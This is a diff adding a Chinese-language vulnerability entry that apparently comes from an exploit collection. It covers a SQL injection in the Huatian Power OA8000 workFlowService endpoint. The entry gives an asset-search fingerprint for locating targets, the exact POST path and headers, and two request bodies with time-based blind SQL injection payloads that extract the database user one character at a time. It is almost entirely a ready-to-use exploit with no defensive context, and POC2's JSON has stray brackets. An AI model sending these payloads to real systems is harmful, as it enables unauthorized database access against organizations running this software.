@@ -1,0 +1,32 @@
+# 华天动力OAworkFlowService存在SQL注入
+
+- **系统**：华天动力　|　**类型**：SQL注入　|　**CVE**：—
+- **指纹**：`app="华天动力-OA8000"`
+- **请求**：`POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1`
+- **关键头**：`Content-Length: 168`　`Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3`
+
+**请求体 / payload**
+```
+<buffalo-call>
+<method>
+getAwokeListData
+</method>
+<string>
+{"k":"SELECT IF(ASCII(SUBSTRING((SELECT USER()),1,1))=114,SLEEP(3),0)"}
+</string>
+</buffalo-call>
+**POC2:**
+POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
+Host:
+Content-Length: 168
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+<buffalo-call>
+<method>
+getRelationData
+</method>
+<string>
+{"ary":[{"sql":"SELECT IF(ASCII(SUBSTRING((SELECT USER()),1,1))=114,SLEEP(3),0)"}]}]}
+</string>
+</buffalo-call>
+```
+- **预期**：200　|　—
